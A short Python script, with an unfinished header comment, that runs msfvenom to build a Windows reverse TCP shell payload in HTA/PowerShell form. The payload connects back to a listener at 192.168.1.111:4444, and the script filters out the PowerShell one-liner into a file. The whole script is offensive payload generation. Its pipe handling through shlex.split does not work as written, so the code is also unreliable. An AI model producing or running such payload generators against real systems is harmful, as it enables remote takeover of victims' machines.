#This script is used to create

import os
import subprocess
import shlex

with open('command.out', 'w') as stdout_file:
	command = """msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh  | awk '/powershell.exe -nop/ {print}'"""
	process_output = subprocess.run(shlex.split(command), stdout=stdout_file, stderr=subprocess.DEVNULL, text=True)
	#print(process_output.__dict__)
	#print(process_output.stdout)